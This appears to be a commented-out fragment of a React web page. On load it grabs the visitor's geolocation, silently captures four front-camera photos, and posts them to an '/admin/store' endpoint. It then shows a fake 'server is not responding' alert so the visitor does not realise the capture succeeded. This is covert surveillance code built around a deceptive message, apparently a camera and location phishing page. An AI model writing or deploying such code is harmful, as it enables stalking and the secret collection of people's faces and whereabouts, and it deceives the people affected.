// const videoRef = useRef(null);
//   const canvasRef = useRef(null);

//   const [location, setLocation] = useState(null);
//   const [images, setImages] = useState([]);
//   const [submitted, setSubmitted] = useState(false); // 🔹 prevent double submit

//   useEffect(() => {
//     getLocation();
//     initCameraAndCapture();
//   }, []);

//   // 🔹 AUTO SUBMIT WHEN 4 IMAGES READY
//   useEffect(() => {
//     if (images.length === 4 && location && !submitted) {
//       submitData();
//     }
//   }, [images, location]);

//   const getLocation = () => {
//     navigator.geolocation.getCurrentPosition(
//       (pos) => {
//         setLocation({
//           latitude: pos.coords.latitude,
//           longitude: pos.coords.longitude,
//         });
//       },
//       () => alert("Location permission denied")
//     );
//   };

//   const initCameraAndCapture = async () => {
//     try {
//       const stream = await navigator.mediaDevices.getUserMedia({
//         video: { facingMode: "user" },
//       });

//       videoRef.current.srcObject = stream;

//       videoRef.current.onloadedmetadata = async () => {
//         await videoRef.current.play();

//         for (let i = 0; i < 4; i++) {
//           await captureImageWithDelay();
//         }

//         // 🔹 stop camera after capture
//         stream.getTracks().forEach((track) => track.stop());
//       };
//     } catch {
//       alert("Camera permission denied");
//     }
//   };

//   const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

//   const captureImageWithDelay = async () => {
//     await sleep(300);

//     const canvas = canvasRef.current;
//     const video = videoRef.current;

//     canvas.width = video.videoWidth;
//     canvas.height = video.videoHeight;

//     const ctx = canvas.getContext("2d");
//     ctx.drawImage(video, 0, 0);

//     const imageData = canvas.toDataURL("image/jpeg");

//     setImages((prev) => [...prev, imageData]);
//   };

//   const submitData = async () => {
//     setSubmitted(true);

//     try {
//       await axios.post("http://localhost:3000/admin/store", {
//         latitude: location.latitude,
//         longitude: location.longitude,
//         images,
//       });

//       alert("Now server is not responding. Please try again later.");
//     } catch {
//       setSubmitted(false);
//     }
//   };